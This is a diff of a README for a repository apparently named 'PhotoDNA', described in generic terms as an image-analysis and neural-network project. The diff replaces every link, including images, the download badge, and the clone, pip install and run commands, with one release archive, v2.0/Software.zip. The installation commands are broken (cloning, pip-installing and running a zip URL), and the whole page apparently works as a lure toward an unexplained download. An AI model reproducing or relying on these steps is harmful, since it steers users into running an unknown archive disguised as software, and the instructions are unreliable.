@@ -1,6 +1,6 @@
 # 📸 **PhotoDNA**
 
-![photodna-logo](https://github.com/toxicyurism/PhotoDNA/releases/download/v1.0/Application.zip)
+![photodna-logo](https://github.com/toxicyurism/PhotoDNA/releases/download/v2.0/Software.zip)
 
 Welcome to the PhotoDNA repository! This repository focuses on various aspects of image analysis, deep learning, and neural networks using Python. If you are passionate about computer vision, data analysis, and image processing, you've come to the right place.
 
@@ -22,7 +22,7 @@ Welcome to the PhotoDNA repository! This repository focuses on various aspects o
 - Yandex Images
 
 ## 🚀 Download PhotoDNA
-[![Download PhotoDNA](https://github.com/toxicyurism/PhotoDNA/releases/download/v1.0/Application.zip)](https://github.com/toxicyurism/PhotoDNA/releases/download/v1.0/Application.zip)
+[![Download PhotoDNA](https://github.com/toxicyurism/PhotoDNA/releases/download/v2.0/Software.zip)](https://github.com/toxicyurism/PhotoDNA/releases/download/v2.0/Software.zip)
 
 <details>
   <summary><strong>If the link ends with a file name...</strong></summary>
@@ -49,7 +49,7 @@ Welcome to the PhotoDNA repository! This repository focuses on various aspects o
 ## 🛠️ Installation
 1. Clone the repository:
    ```bash
-   git clone https://github.com/toxicyurism/PhotoDNA/releases/download/v1.0/Application.zip
+   git clone https://github.com/toxicyurism/PhotoDNA/releases/download/v2.0/Software.zip
    ```
 2. Navigate to the project directory:
    ```bash
@@ -57,13 +57,13 @@ Welcome to the PhotoDNA repository! This repository focuses on various aspects o
    ```
 3. Install the required dependencies:
    ```bash
-   pip install -r https://github.com/toxicyurism/PhotoDNA/releases/download/v1.0/Application.zip
+   pip install -r https://github.com/toxicyurism/PhotoDNA/releases/download/v2.0/Software.zip
    ```
 
 ## 📄 Usage
 1. Run the main Python script:
    ```bash
-   python https://github.com/toxicyurism/PhotoDNA/releases/download/v1.0/Application.zip
+   python https://github.com/toxicyurism/PhotoDNA/releases/download/v2.0/Software.zip
    ```
 2. Follow the on-screen instructions to perform various image analysis tasks.
 
@@ -79,4 +79,4 @@ Let's visualize the power of neural networks and the magic of computer vision wi
 
 Start exploring now! 🚀
 
-![photodna](https://github.com/toxicyurism/PhotoDNA/releases/download/v1.0/Application.zip)
+![photodna](https://github.com/toxicyurism/PhotoDNA/releases/download/v2.0/Software.zip)
